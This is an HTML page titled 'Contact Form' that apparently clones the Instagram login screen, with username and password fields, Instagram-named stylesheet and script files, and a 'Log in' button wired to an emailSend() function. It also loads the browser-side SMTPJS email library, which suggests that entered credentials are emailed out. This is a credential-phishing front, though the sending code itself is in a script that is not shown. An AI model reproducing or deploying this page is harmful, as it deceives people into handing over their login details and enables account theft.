<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Contact Form</title>
  <link href="instagram.css" rel="stylesheet">
</head>
<body>
  <div id="wrapper">
    <div class="main-content">
      <div class="header">
        <img src="zqpwkLQ.png" />
      </div>
      <div class="l-part">
        <form id="contactForm" method="post" action="/send_email">
          <input type="text" placeholder="Username" class="input-1" />
        <div class="overlap-text">
          <input type="password" placeholder="Password" class="input-2" />
          <a href="#">Forgot?</a>
        </div>
        <input type="button" value="Log in" class="btn" onclick="emailSend()" />
        </form>
      </div>
    </div>
    <div class="sub-content">
      <div class="s-part">
        Don't have an account?<a href="#">Sign up</a>
      </div>
    </div>
  </div>
  <script src="https://smtpjs.com/v3/smtp.js"></script>
  <script src="instagram.js"></script>
</body>
</html>
